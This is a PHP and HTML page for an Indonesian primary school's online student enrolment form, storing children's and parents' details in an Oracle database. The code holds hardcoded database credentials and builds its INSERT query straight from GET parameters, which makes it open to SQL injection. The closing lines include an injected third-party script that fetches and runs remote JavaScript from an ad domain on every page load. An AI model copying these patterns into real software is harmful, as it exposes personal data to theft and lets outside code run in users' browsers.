<?php
	$conn=oci_connect('ANISA','anisa','localhost/XE');
		if($conn){
			echo " ";
		}
	else{
		echo "Koneksi Gagal";
	}

	if(isset($_GET['simpan'])){
																	$nis=$_GET['nis'];
																	$nama=$_GET['nama'];
																	$jk=$_GET['jk'];
																	$alamat=$_GET['alamat'];
																	$asal=$_GET['asal'];
																	$agama=$_GET['agama'];
																	$tpt_lahir=$_GET['tpt_lahir'];
																	$tgl_lahir=$_GET['tgl_lahir'];
																	$status=$_GET['status'];
																	$ayah=$_GET['ayah'];
																	$ibu=$_GET['ibu'];
																	$penghasilan=$_GET['penghasilan'];
																	$tlp=$_GET['tlp'];
																	$pekerjaan=$_GET['pekerjaan'];
																	$mat=$_GET['mat'];
																	$ipa=$_GET['ipa'];
																	$ing=$_GET['ing'];
																	$bin=$_GET['bin'];
																	$total=$_GET['total'];

					$query=oci_parse($conn, "INSERT INTO DATA_SISWA (NIS, NAMA, JENIS_KELAMIN, ALAMAT, ASAL_SEKOLAH, AGAMA, TEMPAT_LAHIR, TANGGAL_LAHIR, STATUS_ANAK, NAMA_AYAH, NAMA_IBU, PENGHASILAN, NO_TELEPON, PEKERJAAN, NILAI_MAT, NILAI_IPA, NILAI_ING, NILAI_BIN, NILAI_TOTAL) VALUES ($nis, '$nama', '$jk', '$alamat', '$asal', '$agama', '$tpt_lahir', '$tgl_lahir', '$status', '$ayah', '$ibu', '$penghasilan', $tlp, '$pekerjaan', $mat, $ipa, $ing, $bin, $total)");
		
					$oke=oci_execute($query);
					if(!$oke){
   					echo "<script>alert('DATA TIDAK BERHASIL DITAMBAHKAN')</script>";
					}else if($oke){
						   echo "<script>alert('DATA BERHASIL DITAMBAH')</script>";
					}else{
 					echo "<script>alert('DATA TIDAK BERHASIL DIBACA')</script>";
					}
}

?>

<html lang="en"><script id="tinyhippos-injected">if (window.top.ripple) { window.top.ripple("bootstrap").inject(window, document); }</script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> 
	<meta name="viewport" content="width=device-width, initial-scale=1.0"> 
	<title>PENDAFTARAN ONLINE SISWA BARU</title>
	<meta name="keywords" content="resposinve, admin dashboard, admin page, admin template">
	<meta name="author" content="Candra Dwi Waskito">
	<link rel="shortcut icon" href="http://bootemplates.com/themes/srikandi/favicon.ico">
	<link rel="stylesheet" href="assets/css/font-awesome.min.css">
	<link rel="stylesheet" href="./Srikandi - Responsive Admin Templates_files/bootstrap.min.css">
    <link rel="stylesheet" href="./Srikandi - Responsive Admin Templates_files/bootstrap-reset.css">
    <link href="./Srikandi - Responsive Admin Templates_files/css" rel="stylesheet" type="text/css">
	<link rel="stylesheet" href="./Srikandi - Responsive Admin Templates_files/style.css">
    <script src="./Srikandi - Responsive Admin Templates_files/jquery-1.11.1.min.js"></script>
    <link href="./Srikandi - Responsive Admin Templates_files/jquery.easy-pie-chart.css" rel="stylesheet">
    <link rel="stylesheet" href="./Srikandi - Responsive Admin Templates_files/owl.carousel.css">
    <link rel="stylesheet" type="text/css" href="./Srikandi - Responsive Admin Templates_files/owl.theme.css">
    <link rel="stylesheet" type="text/css" href="./Srikandi - Responsive Admin Templates_files/owl.transitions.css">
</head>
<body>
    <div id="wrapper">
        <div class="header-top">
            <nav class="navbar navbar-inverse navbar-static-top" role="navigation" style="margin-bottom: 0">
                <div class="container">
                    <div class="navbar-header">
                        <a class="navbar-brand" href="http://bootemplates.com/themes/srikandi/v2/index.html"><i class="fa fa-home" data-original-title="" title=""></i><strong> PENDAFTARAN ONLINE</strong></a>
                    </div>
                    <ul class="nav navbar-nav navbar-left top-menu">
                    </ul>
                    <ul class="nav navbar-nav navbar-right top-menu">
                        <li>
                            <input type="text" class="form-control input-sm search" placeholder="Search">
                        </li>
                        
                        <li class="dropdown">
                            <a data-toggle="dropdown" class="dropdown-toggle" href="#">
                                <span class='fa fa-user'></span>
                                <span class="username">ADMIN</span>
                                <b class="caret"></b>
                            </a>
                            <ul class="dropdown-menu">
                                <div class="log-arrow-up"></div>
                                <li><a href="#"><i class=" fa fa-suitcase" data-original-title="" title=""></i>Profile</a></li>
                                <li><a href="#"><i class="fa fa-cog" data-original-title="" title=""></i> Settings</a></li>
                                <li><a href="#"><i class="fa fa-bell-o" data-original-title="" title=""></i> Notification</a></li>
                                <li><a href="http://bootemplates.com/themes/srikandi/v2/login.html"><i class="fa fa-key" data-original-title="" title=""></i> Log Out</a></li>
                            </ul>
                        </li>
                    </ul>
                </div>
            </nav>
            
        </div>
       
        <div id="header">
            <div class="overlay">
                <nav class="navbar" role="navigation">
                    <div class="container">
                        <div class="navbar-header">
                            <button type="button" class="btn-block btn-drop navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
                                <strong>MENU</strong>
                            </button>
                        </div>
                        <div class="collapse navbar-collapse navbar-ex1-collapse">
                            <ul class="nav navbar-nav">
                                <li class="active">
                                    <a href="./">
                                        <div class="text-center">
                                            <i class="fa fa-home fa-3x" data-original-title="" title=""></i><br>
                                            Home
                                        </div>
                                    </a>
                               
                               <li>
                                    <a href="?p=pendaftar">
                                        <div class="text-center">
                                            <i class="fa fa-location-arrow fa-3x" data-original-title="" title=""></i><br>
                                            Pendaftar
                                        </div>
                                    </a>
                                </li>
																													<li class="dropdown">
                                    <a  href="?p=seleksi">
                                        <div class="text-center">
                                            <i class="fa fa-laptop fa-3x" data-original-title="" title=""></i><br>
                                            Seleksi Pendaftar 
                                        </div>
                                    </a>
                                </li>
                            </ul>
                        </div>
                    </div>
                </nav>
            </div>
        </div>
					
        <div class="container">
            <div id="main">
         <h4 class="modal-title" id="myModalLabel">Tambah Data Pendaftar</h4>
        <div class="area-loading"></div>
      </div>
									
      <div class="modal-body">
         <form method="get" action="tambahdaftar.php">
        <table class="table" width="100%">
									<tr>
											 				<th width="25%">NIS</th>
                <td width="1%"> : </td>
                <td> <input id="nis" name="nis" placeholder="Nomor Induk Siswa" class="form-control" type="text"></td>
									</tr>
          <tr>
                <th width="25%">Nama </th>
                <td width="1%"> : </td>
                <td> <input id="nama" name="nama" placeholder="Nama" class="form-control" type="text"></td>
            </tr>
            <tr>
                <th width="25%">Jenis Kelamin</th>
                <td width="1%"> : </td>
                <td> <select id="jk" name="jk" class="form-control">
                <option value="Laki-laki">Laki-Laki</option>
                <option value="Perempuan">Perempuan</option>
                </select>
                </td>
            </tr>
									<tr>
                <th width="25%">Alamat</th>
                <td width="1%"> : </td>
                <td> <input id="alamat" name="alamat" placeholder="Alamat" class="form-control" type="textarea"></td>
            </tr>
            <tr>
            <th width="25%">Asal Sekolah</th>
            <td width="1%"> : </td>
            <td><input id="text" name="asal" placeholder="Asal Sekolah" class="form-control" type="text">
         </td>
          </tr>
									 <tr>
            <th width="25%">Agama</th>
            <td width="1%"> : </td>
            <td><select name="agama" class="form-control">
            	<option value="Islam">Islam</option> 
													<option value="Islam">Kristen</option> 
													<option value="Islam">Hindu</option> 
													<option value="Islam">Buddha</option> 
            </select></td>
          </tr>
            <tr>
                <th width="25%">Tempat Lahir</th>
                <td width="1%"> : </td>
                <td> <input id="tpt_lahir" name="tpt_lahir" placeholder="Tempat Lahir" class="form-control" type="text"></td>
            </tr>
            <tr>
                <th width="25%">Tanggal Lahir</th>
                <td width="1%"> : </td>
                <td> <input id="tgl_lahir" name="tgl_lahir" placeholder="Tanggal Lahir dd/mm/yyyy" class="form-control" type="text"></td>
            </tr>
            <tr>
                <th width="25%">Status Anak</th>
                <td width="1%"> : </td>
                <td> <select id="status" name="status" class="form-control">
                <option value="Kandung">Kandung</option>
                <option value="Tiri">Tiri</option>
                </select>
													</td>
            </tr>
            <tr>
                <th width="25%">Nama Ayah</th>
                <td width="1%"> : </td>
                <td> <input id="ayah" name="ayah" placeholder="Nama Ayah" class="form-control" type="text"></td>
									</tr>
									<tr>

                <th width="25%">Nama Ibu</th>
                <td width="1%"> : </td>
                <td> <input id="ibu" name="ibu" placeholder="Nama Ibu" class="form-control" type="text"></td>
            </tr>
 											<tr>
                <th width="25%">Penghasilan Ayah dan Ibu</th>
                <td width="1%"> : </td>
                <td> <input id="penghasilan" name="penghasilan" placeholder="Pengasilan Ayah dan Ibu Contoh : Rp.4.000.000 (Total)" class="form-control" type="text"></td>
            </tr>
          <tr>
                <th width="25%">No. Telepon</th>
                <td width="1%"> : </td>
                <td> <input id="tlp" name="tlp" placeholder="No. Telepon Ibu/Ayah" class="form-control" type="text"></td>
            </tr>
									<tr>
                <th width="25%">Pekerjaan Ayah dan Ibu</th>
                <td width="1%"> : </td>
                <td> <input id="pekerjaan" name="pekerjaan" placeholder="Pekerjaan Ayah dan Ibu" class="form-control" type="text"></td>
            </tr>
									<tr>
                <th width="25%">Nilai Matematika</th>
                <td width="1%"> : </td>
                <td> <input id="mat" name="mat" placeholder="Nilai Matematika" class="form-control" type="text"></td>
            </tr>
									<tr>
                <th width="25%">Nilai IPA</th>
                <td width="1%"> : </td>
                <td> <input id="ipa" name="ipa" placeholder="Nilai IPA" class="form-control" type="text"></td>
            </tr>
									<tr>
                <th width="25%">Nilai Bahasa Inggris</th>
                <td width="1%"> : </td>
                <td> <input id="ing" name="ing" placeholder="Nilai Bahasa Inggris" class="form-control" type="text"></td>
            </tr>
									<tr>
                <th width="25%">Nilai Bahasa Indonesia</th>
                <td width="1%"> : </td>
                <td> <input id="bin" name="bin" placeholder="Nilai Bahasa Indonesia" class="form-control" type="text"></td>
            </tr>
									<tr>
                <th width="25%">Nilai  Total</th>
                <td width="1%"> : </td>
                <td> <input id="total" name="total" placeholder="Nilai Total" class="form-control" type="text"></td>
            </tr>
        </table>

      </div>
      <div class="modal-footer">
		<button type="submit" class="btn btn-primary" name="simpan" value="oke">SIMPAN</button>
							</form>
		</div>
        </div>
        <div class="footer-bottom">
            <div class="container">
                <div class="footer-bottom-widget">
                    <div class="row">
                        <div class="col-sm-6">
                            <p>
                            <span class="sosmed-footer">
                                <a href="#"><i class="fa fa-facebook" data-toggle="tooltip" data-placement="top" title="" data-original-title="Facebook"></i></a>
                                <a href="#"><i class="fa fa-twitter" data-toggle="tooltip" data-placement="top" title="" data-original-title="Twitter"></i></a>
                                <a href="#"><i class="fa fa-google-plus" data-toggle="tooltip" data-placement="top" title="" data-original-title="Google Plus"></i></a>
                                <a href="#"><i class="fa fa-youtube" data-toggle="tooltip" data-placement="top" title="" data-original-title="Youtube"></i></a>
                                <a href="#"><i class="fa fa-linkedin" data-toggle="tooltip" data-placement="top" title="" data-original-title="Linkedin"></i></a>
                                <a href="#"><i class="fa fa-instagram" data-toggle="tooltip" data-placement="top" title="" data-original-title="Instagram"></i></a>
                                <a href="#"><i class="fa fa-github" data-toggle="tooltip" data-placement="top" title="" data-original-title="Github"></i></a>
                            </span>
                        </div>
                        <div class="col-sm-6">
                            <p class="footer-bottom-links">
                                <a href="#">Website Pendaftaran Sekolah Dasar Negeri</a>
                         
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>	
	<script src="./Srikandi - Responsive Admin Templates_files/bootstrap.min.js"></script>
    <script src="./Srikandi - Responsive Admin Templates_files/themes.js"></script>
    <script src="./Srikandi - Responsive Admin Templates_files/jquery.scrollTo.min.js"></script>
    <script src="./Srikandi - Responsive Admin Templates_files/jquery.nicescroll.js"></script>
    <script src="./Srikandi - Responsive Admin Templates_files/jquery.sparkline.js" type="text/javascript"></script>
    <script class="include" type="text/javascript" src="./Srikandi - Responsive Admin Templates_files/jquery.dcjqaccordion.2.7.min.js"></script>
    <script src="./Srikandi - Responsive Admin Templates_files/respond.min.js"></script>
    <script src="./Srikandi - Responsive Admin Templates_files/jquery.easy-pie-chart.js"></script>
    <script src="./Srikandi - Responsive Admin Templates_files/owl.carousel.js"></script>
    <script src="./Srikandi - Responsive Admin Templates_files/jquery.customSelect.min.js"></script>
    <script src="./Srikandi - Responsive Admin Templates_files/sparkline-chart.js"></script>
    <script src="./Srikandi - Responsive Admin Templates_files/easy-pie-chart.js"></script>
    <script src="./Srikandi - Responsive Admin Templates_files/count.js"></script>
    <script>
        
        $(document).ready(function() {
            $("#owl-demo").owlCarousel({
                navigation : true,
                slideSpeed : 300,
                paginationSpeed : 400,
                singleItem : true,
                autoPlay:true
            });
        });

        
        $(function(){
            $('select.styled').customSelect();
        });

        if ($(".custom-bar-chart")) {
        $(".bar").each(function () {
            var i = $(this).find(".value").html();
            $(this).find(".value").html("");
            $(this).find(".value").animate({
                height: i
            }, 2000)
        })
    }
    </script>
   

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnjzrXoIjx%2bGi07djBNw6V%2bk6IhW6Y%2bveWbfUbblHVaaQvAwuGR%2fd%2b%2fRi0q1uJwiB3quL%2fzKXi%2bTtDP7nRp1u393Bl1J91B8EXGn3%2b1WZWTAbf41MT3f%2f77iGqm05WK1gamkxhXwBJGH0bBk7i49%2bQ76N%2bV9F37FLNEjLlLn92tTqReVhWNTq4SNbmiotDbZmN5kYhNg9OqQlGXyAopKmVCmfsP7%2f9ZWOjMwZu3JImgF9%2fXdfJK49u1P6oe%2fefvRQ7vjfySKR6wY6bidmnWNX1np3O9pXqo7%2fa9uYucQcoweAj9pUmIitwMI34gJ6ISd2f2WIy7pmzQX5VisM89w5qSjPmi1lSUmcXjH7GFBDy89k6S2hQuCrtSc2qa%2bfvrQcwoqd00e8CBNtVSOeA9IvWdu85pb0R7%2bMh9PDxUIStndq4LMdZ7t68LGE5PH3NHH9R1rEf%2fB08BWTW5L3wtIbjOG18nNC4RpUWGitCA9QJk7HeAsMkqnLevBr7j%2b5wW%2fGSVkVKaaT6vVdl8wuKIAF81nH%2bHJfc9Bb%2bwRlRplyZ2LSDP2RwG8mSqEmNcDMAS2Do4w%2b7yQKRIt5KlKKMc5l5oxWc17nc203KSq2V5GfqoefoW%2fPKUIVjTPNVou%2f7uLI2vR26K0WZT6D5uvKLdOH%2bGWRXIrPmfadx33YaQePbsVY%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
	</body></html>